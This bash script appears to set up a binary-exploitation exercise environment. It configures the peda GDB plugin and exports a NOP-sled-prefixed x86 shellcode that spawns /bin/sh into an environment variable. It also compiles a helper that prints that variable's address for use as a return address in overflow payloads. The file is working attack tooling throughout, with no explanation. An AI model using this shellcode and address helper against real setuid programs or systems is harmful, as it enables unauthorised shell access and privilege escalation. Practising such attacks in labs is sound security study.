#!/usr/bin/env bash

export HOME=/tmp

echo "source /tmp/peda/peda.py" > ~/.gdbinit
echo 'echo "source /tmp/peda/peda.py" > ~/.gdbinit'

if test ! -d /tmp/peda
then
echo "[WARNING] peda is not in /tmp"
fi

export SHELLCODE=$(python -c 'print 50 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
echo 'SHELLCODE = 50 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'

if test ! -f /tmp/getenv.c
then
echo '#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int main(int ac, char **av)
{
    if (ac != 2)
        av[1] = "SHELLCODE";
   int nb = (int)getenv(av[1]) + 32;
    printf("\\x%02x\\x%02x\\x%02x\\x%02x", (nb >> 0) & 0xff, (nb >> 8) & 0xff, (nb >> 16) & 0xff, (nb >> 24) & 0xff);
}' > /tmp/getenv.c
echo "/tmp/getenv.c created"

gcc /tmp/getenv.c -m32 -o /tmp/getenv
echo "/tmp/getenv compiled"
fi

export SCADDR=$(python -c 'import sys; print sys.argv[1].replace("\\x", "").decode("hex")' $(/tmp/getenv SHELLCODE))
python -c 'import sys; print "SCADDR = " + sys.argv[1]' $(/tmp/getenv SHELLCODE)
